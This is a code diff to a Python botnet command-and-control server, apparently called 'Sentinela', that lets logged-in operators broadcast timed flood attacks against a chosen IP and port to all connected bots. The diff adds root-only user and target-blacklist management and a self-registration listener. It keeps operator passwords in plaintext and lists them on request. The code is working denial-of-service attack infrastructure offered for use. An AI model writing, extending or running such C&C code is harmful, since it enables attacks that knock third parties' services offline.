@@ -2,13 +2,15 @@ import socket
 import threading
 import sys
 import time
-import ipaddress
+import ipaddress, json
 from colorama import Fore, init
 
 bots={}
 clients={}
 attacks={}
+
 maxAttacks=30
+rootUser='root'
 
 ansi_clear = '\033[2J\033[H'
 
@@ -32,7 +34,6 @@ def color(data_input_output):
         "LIGHTWHITE_EX": '\033[97m',
     }
     return color_codes.get(data_input_output, "")
-
 lightwhite = color("LIGHTWHITE_EX")
 gray = color("LIGHTBLSYN_EX")
 yellow = color("LIGHTYELLOW_EX")
@@ -44,6 +45,12 @@ banner = f'''
                     {Y}+    {C}Type 'Help' for commands     {Y}+
                     {Y}+ + + + + + + + + + + + + + + + + +
         '''
+
+admin_commands = f"""
+{gray}Admin Commands:
+{lightwhite}!USER               {gray}Add/List/Remove users
+{lightwhite}!BLACKLIST          {gray}Black List targets
+"""
 
 def botnetMethodsName(method):
     method_name = {
@@ -62,6 +69,7 @@ def botnetMethodsName(method):
     if method == 'ALL':
         return method_name
     return method_name.get(method, "")
+
 def isBotnetMethod(method):
     return botnetMethodsName(method) != ""
 
@@ -70,7 +78,7 @@ def removeAttacks(username, timeout):
     if username in attacks:
         del attacks[username]
 
-def checkUser(username):
+def checkUserAttack(username):
     if username in attacks:
         return False
     return True
@@ -95,12 +103,94 @@ def validate_port(port, rand=False):
 def validate_time(time):
     return time.isdigit() and int(time) >= 10 and int(time) <= 1300
 
+def check_Blacklisted_Target(target):
+    try:
+        with open('blacklist.txt', 'r') as file:
+            blacklist_target = {x.strip() for x in file if x.strip()}
+        return target in blacklist_target
+    except FileNotFoundError:
+        print("File 'blacklist.txt' not found.")
+        return False
+
 def find_login(username, password):
     credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
     for x in credentials:
         c_username, c_password = x.split(':')
         if c_username.lower() == username.lower() and c_password == password:
             return True
+
+def blacklist_idk(args, send, client):
+    try:
+        choice = (args[1]).upper()
+
+        if choice == 'ADD' or choice == 'A':
+            if len(args) == 3:
+                target = args[2]
+                with open('blacklist.txt', 'a') as blacklist:
+                    blacklist.write(f'\n{target}')
+                    blacklist.close()
+                    send(client, f'{Fore.LIGHTWHITE_EX}\nTarget has been blacklisted!.\n')
+            else:
+                send(client, '\n!BLACKLIST ADD [TARGET]\n')
+        
+        if choice == 'REMOVE' or choice == 'R':
+            if len(args) == 3:
+                target = args[2]
+                with open("blacklist.txt", "r") as blacklist:
+                    lines = blacklist.readlines()
+                    blacklist.close()
+
+                with open("blacklist.txt", "w") as blacklist:
+                    for line in lines:
+                        if target not in line:
+                            blacklist.write(line)
+                    blacklist.close()
+                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved target successfully!\n')
+            else:
+                send(client, '\n!BLACKLIST REMOVE [TARGET]\n')
+        
+        if choice == 'LIST' or choice == 'L':
+                blacklist = [x.strip() for x in open('blacklist.txt').readlines() if x.strip()]
+                for x in blacklist:
+                    send(client, f"{lightwhite}Target: {gray}{x}{lightwhite}")
+    except:
+        send(client, '\n!BLACKLIST ADD/LIST/REMOVE\n')
+
+def users(args, send, client):
+    try:
+        choice = (args[1]).upper()
+        if choice == 'ADD' or choice == 'A':
+            if len(args) == 4:
+                user = args[2]
+                password = args[3]
+                with open('logins.txt', 'a') as logins:
+                    logins.write(f'\n{user}:{password}')
+                    logins.close()
+                    send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
+            else:
+                send(client, '\n!USER ADD [USERNAME] [PASSWORD]\n')
+        if choice == 'REMOVE' or choice == 'R':
+            if len(args) == 3:
+                user = args[2]
+                with open("logins.txt", "r") as logins:
+                    lines = logins.readlines()
+                    logins.close()
+
+                with open("logins.txt", "w") as logins:
+                    for line in lines:
+                        if user not in line:
+                            logins.write(line)
+                    logins.close()
+                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
+            else:
+                send(client, '\n!USER REMOVE [USERNAME]\n')
+        if choice == 'LIST' or choice == 'L':
+                credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
+                for x in credentials:
+                    c_username, c_password = x.split(':')
+                    send(client, f"{lightwhite}Username: {gray}{c_username}{lightwhite} | Password: {gray}{c_password}{lightwhite}")
+    except:
+        send(client, '\n!USER ADD/LIST/REMOVE\n')
 
 def send(socket, data, escape=True, reset=True):
     if reset:
@@ -140,7 +230,7 @@ def ping():
 def update_title(client, name):
     titles = [
         'S', 'Se', 'Sen', 'Sent', 'Senti', 'Sentin', 'Sentine', 'Sentinel', 'Sentinela',
-        'Sentinela', 'Sentinel', 'Sentine', 'Sentin', 'Senti', 'Sent', 'Sen', 'Se'
+        'Sentinela', 'Sentinel', 'Sentine', 'Sentin', 'Senti', 'Sent', 'Sen', 'Se', 'S'
         ]
     while True:
         try:
@@ -176,6 +266,11 @@ def command_line(client, username):
                 send(client, f'{C}CLEAR{gray}               Clears the screen')
                 send(client, f'{C}LOGOUT{gray}              Disconnects from C&C server\n')
 
+            elif command == '!ADMIN' or command == '!ADM':
+                if username == rootUser:
+                    for x in admin_commands.split('\n'):
+                        send(client, x)
+
             elif command == 'BOTNET':
                 botnetMethods = botnetMethodsName('ALL')
                 send(client, f'{gray}Botnet Methods:')
@@ -186,9 +281,25 @@ def command_line(client, username):
             elif command == 'BOTS':
                 send(client, f'{C}Connected bots: {G}{len(bots)}\n')
 
+            elif command == '!R' or command == '!REG' or command == '!REGISTER':
+                if username == rootUser:
+                    if len(args) == 1:
+                        threading.Thread(target=reg_main).start()
+                        send(client, f'\n{Fore.CYAN}Started registration server.\n')
+                    else:
+                        send(client, f'\n{Fore.CYAN}Usage: {command}\n')
+
+            elif command == '!USER' or command == '!U':
+                if username == rootUser:
+                    users(args, send, client)
+
+            elif command == '!BL' or command == '!BLACKLIST' or command == '!B':
+                if username == rootUser:
+                    blacklist_idk(args, send, client)
+
             elif command == 'OWNER' or command == 'CREDITS':
                 send(client, f'\n{B}Instagram{gray}: {Q}cirqueirakkjk')
-                send(client, f'{B}Telegram{gray}: {Q}CirqueiraDev')
+                send(client, f'{B}Telegram{gray}: {Q}Cirqueiraza')
                 send(client, f'{B}Discord{gray}: {Q}cirqueira')
                 send(client, f'{B}GitHub{gray}: {Q}CirqueiraDev\n')
 
@@ -197,7 +308,7 @@ def command_line(client, username):
                 for x in banner.split('\n'):
                     send(client, x)
 
-            elif command == 'LOGOUT' or command == 'QUIT' or command == 'EXIT':
+            elif command == 'LOGOUT' or command == 'QUIT' or command == 'EXIT' or command == 'BYE':
                 send(client, f'\n{B}America ya!\n')
                 time.sleep(1)
                 break
@@ -208,37 +319,43 @@ def command_line(client, username):
                     ip = args[1]
                     port = args[2]
                     secs = args[3]
-                    if validate_ip(ip):
-                        if validate_port(port):
-                            if validate_time(secs):
-                                if len(attacks) < maxAttacks:
-                                    if checkUser(username):
-                                        if TargetIsAlreadySent(ip, username):
-                                            attackSend = f'''
+
+                    if check_Blacklisted_Target(ip) == False:
+                        if validate_ip(ip):
+                            if validate_port(port):
+                                if validate_time(secs):
+                                    if len(attacks) < maxAttacks:
+                                        if checkUserAttack(username):
+                                            if TargetIsAlreadySent(ip, username):
+                                                
+                                                attackSend = f'''
 {gray}> {lightwhite}Method   {gray}: {yellow}{botnetMethodsName(command).strip()}{gray}
 {gray}> {lightwhite}Target   {gray}: {lightwhite}{ip}{gray}
 {gray}> {lightwhite}Port     {gray}: {lightwhite}{port}{gray}
 {gray}> {lightwhite}Duration {gray}: {lightwhite}{secs}{gray}'''
-                                            
-                                            for x in attackSend.split('\n'):
-                                                send(client, '\x1b[3;31;40m'+ x)
                                                 
-                                            send(client, f'{G} Attack sent to {len(bots)} {"bots\n" if len(bots) > 1 else "bot"}\n')
-                                            attacks.update({username: {'target': ip, 'duration': secs}})
-                                            threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
-                                            broadcast(data)
+                                                for x in attackSend.split('\n'):
+                                                    send(client, '\x1b[3;31;40m'+ x)
+
+                                                broadcast(data)
+                                                send(client, f'{G} Attack sent to {len(bots)} bots\n')
+                                                attacks.update({username: {'target': ip, 'duration': secs}})
+                                                threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
+                                            
+                                            else:
+                                                send(client, Fore.RED + "Target is already under flood, don't abuse it!\n")
                                         else:
-                                            send(client, Fore.RED + "Target is already under flood, don't abuse it!\n")
+                                            send(client, Fore.RED + "Attack already sent!\n")
                                     else:
-                                        send(client, Fore.RED + "Attack already sent!\n")
+                                        send(client, Fore.RED + 'No slots available!\n')
                                 else:
-                                    send(client, Fore.RED + 'No slots available!\n')
+                                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)\n')
                             else:
-                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)\n')
+                                send(client, Fore.RED + 'Invalid port number (1-65535)\n')
                         else:
-                            send(client, Fore.RED + 'Invalid port number (1-65535)\n')
+                            send(client, Fore.RED + 'Invalid IP-address\n')
                     else:
-                        send(client, Fore.RED + 'Invalid IP-address\n')
+                        send(client, Fore.RED + 'Target is blacklisted!\n')
                 else:
                     send(client, f'Usage: {gray}{command} [IP] [PORT] [TIME]\n')
 
@@ -292,7 +409,75 @@ def handle_client(client, address):
                 client.close()
                 return
         bots.update({client: address})
-    
+
+
+def register(client, address, send):
+    ansi_clear = '\033[2J\033[H'
+
+    bannerLogin= f'''{gray}\nYour username must be between 4 and 14 characters,
+and the same applies to the password\n'''
+
+    try:
+        send(client, ansi_clear, False)
+        for x in bannerLogin.split('\n'):
+            send(client, f'{x}')
+        while 1:
+            send(client, f'\x1b{Fore.LIGHTBLUE_EX}Username :\x1b[0m ', False, False)
+            username = client.recv(1024).decode().strip()
+            if not username or len(username) < 4 or len(username) > 14:
+                continue
+            break
+        with open("logins.txt", "r") as logins:
+            lines = logins.readlines()
+            for line in lines:
+                if username in line:
+                    send(client, f'{Fore.RED}User already exists!')
+                    time.sleep(1)
+                    client.close()
+            logins.close()
+        p1 = ''
+        while 1:
+            send(client, f'\033{Fore.LIGHTBLUE_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
+            while not p1.strip():
+                p1 = client.recv(1024).decode('cp1252').strip()
+            break
+        p2 = ''
+        while 1:
+            send(client, f'\033{Fore.LIGHTBLUE_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
+            while not p2.strip():
+                p2 = client.recv(1024).decode('cp1252').strip()
+            break
+        while 1:
+                if p1 == p2:
+                    with open("logins.txt", "a") as logins:
+                        logins.write("\n" + username + ':' + p1)
+                    send(client, f"{Fore.LIGHTBLUE_EX}\nRegistered!")
+                    print(f'Novo usuario: {username} : {p1}')
+                    time.sleep(2)
+                else:
+                    send(client, "Failed password authentication...")
+                break
+    except:
+        send(client, "Error.")
+
+def reg_main():
+    with open("config.json") as jsonFile:
+        jsonObject = json.load(jsonFile)
+        jsonFile.close()
+    reg_port = int(jsonObject['reg_port'])
+    reg_host = jsonObject['reg_host']
+    init(convert=True)
+    sock = socket.socket()
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        sock.bind((reg_host, reg_port))
+    except:
+        print('\x1b[3;31;40m Failed to bind port')
+        exit()
+    sock.listen()
+    threading.Thread(target=register, args=[*sock.accept(), send]).start()
+
 def main():
     if len(sys.argv) != 2:
         print(f'Usage: python {sys.argv[0]} <C2 port>')
